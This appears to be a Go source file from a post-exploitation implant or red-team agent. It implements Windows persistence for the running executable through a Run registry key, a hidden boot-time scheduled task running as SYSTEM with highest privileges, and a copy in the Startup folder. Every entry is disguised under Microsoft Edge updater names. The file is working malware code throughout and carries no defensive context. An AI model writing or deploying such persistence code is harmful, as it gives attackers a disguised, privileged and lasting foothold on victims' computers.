package ttp

import (
	"fmt"
	"io"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"syscall"
	"unsafe"
)

const (
	hkeyCurrentUser  = syscall.Handle(0x80000001)
	hkeyLocalMachine = syscall.Handle(0x80000002)
	regSZ            = uint32(1)
	keySetValue      = uint32(0x0002)
)

var (
	advapi32         = syscall.NewLazyDLL("advapi32.dll")
	procRegSetValEx  = advapi32.NewProc("RegSetValueExW")
)

// Persist installs persistence using the requested method(s): registry, schtasks, startup, all.
func Persist(method string) (string, error) {
	exe, err := os.Executable()
	if err != nil {
		return "", fmt.Errorf("executable: %w", err)
	}

	var results []string

	if method == "all" || method == "registry" || method == "" {
		if r := installRegistry(exe); r != "" {
			results = append(results, r)
		}
	}
	if method == "all" || method == "schtasks" || method == "" {
		if r := installSchtasks(exe); r != "" {
			results = append(results, r)
		}
	}
	if method == "all" || method == "startup" || method == "" {
		if r := installStartupFolder(exe); r != "" {
			results = append(results, r)
		}
	}

	if len(results) == 0 {
		return "[persist: no method succeeded]", nil
	}
	return strings.Join(results, "\n"), nil
}

// installRegistry adds a Run key.
// Uses HKLM when running as SYSTEM (HKCU maps to HKU\.DEFAULT which may lack the Run key).
// Falls back to HKCU for unprivileged contexts.
func installRegistry(exe string) string {
	subKeyHKLM := `SOFTWARE\Microsoft\Windows\CurrentVersion\Run`
	subKeyHKCU := `Software\Microsoft\Windows\CurrentVersion\Run`

	// Try HKLM first (reliable under SYSTEM); fall back to HKCU.
	type attempt struct {
		root   syscall.Handle
		path   string
		prefix string
	}
	for _, a := range []attempt{
		{hkeyLocalMachine, subKeyHKLM, "HKLM"},
		{hkeyCurrentUser, subKeyHKCU, "HKCU"},
	} {
		subKey, err := syscall.UTF16PtrFromString(a.path)
		if err != nil {
			continue
		}
		var hkey syscall.Handle
		if err := syscall.RegOpenKeyEx(a.root, subKey, 0, keySetValue, &hkey); err != nil {
			continue
		}
		defer syscall.RegCloseKey(hkey)

		valNamePtr, _ := syscall.UTF16PtrFromString("MicrosoftEdgeUpdateService")
		u16 := syscall.StringToUTF16(exe)
		buf := make([]byte, len(u16)*2)
		for i, r := range u16 {
			buf[i*2] = byte(r)
			buf[i*2+1] = byte(r >> 8)
		}
		r1, _, e := procRegSetValEx.Call(
			uintptr(hkey),
			uintptr(unsafe.Pointer(valNamePtr)),
			0,
			uintptr(regSZ),
			uintptr(unsafe.Pointer(&buf[0])),
			uintptr(len(buf)),
		)
		if r1 != 0 {
			return fmt.Sprintf("[persist:registry:err] RegSetValueEx(%s): %v", a.prefix, e)
		}
		return fmt.Sprintf("[persist:registry:ok] %s\\...\\Run\\MicrosoftEdgeUpdateService", a.prefix)
	}
	return "[persist:registry:err] no accessible Run key"
}

// installSchtasks creates a scheduled task triggered at system boot (SYSTEM context).
// Uses ONSTART + RU SYSTEM to avoid account resolution failures when running as SYSTEM.
func installSchtasks(exe string) string {
	cmd := exec.Command("schtasks", "/Create",
		"/SC", "ONSTART",
		"/TN", "MicrosoftEdgeUpdateCore",
		"/TR", exe,
		"/RU", "SYSTEM",
		"/RL", "HIGHEST",
		"/F",
	)
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	out, err := cmd.CombinedOutput()
	if err != nil {
		return fmt.Sprintf("[persist:schtasks:err] %s", strings.TrimSpace(string(out)))
	}
	return "[persist:schtasks:ok] task MicrosoftEdgeUpdateCore (ONSTART/SYSTEM)"
}

// installStartupFolder copies the agent to a Startup folder.
// Tries APPDATA (user) first, then ProgramData (machine-wide) for SYSTEM context.
func installStartupFolder(exe string) string {
	var startupDir string
	if appdata := os.Getenv("APPDATA"); appdata != "" {
		startupDir = filepath.Join(appdata, `Microsoft\Windows\Start Menu\Programs\Startup`)
	} else if pd := os.Getenv("ProgramData"); pd != "" {
		startupDir = filepath.Join(pd, `Microsoft\Windows\Start Menu\Programs\StartUp`)
	} else {
		startupDir = `C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp`
	}
	if err := os.MkdirAll(startupDir, 0755); err != nil {
		return fmt.Sprintf("[persist:startup:err] mkdir: %v", err)
	}
	dst := filepath.Join(startupDir, "msedgeupdate.exe")
	if err := copyFile(exe, dst); err != nil {
		return fmt.Sprintf("[persist:startup:err] copy: %v", err)
	}
	return "[persist:startup:ok] " + dst
}


func copyFile(src, dst string) error {
	in, err := os.Open(src)
	if err != nil {
		return err
	}
	defer in.Close()
	out, err := os.Create(dst)
	if err != nil {
		return err
	}
	defer out.Close()
	_, err = io.Copy(out, in)
	return err
}
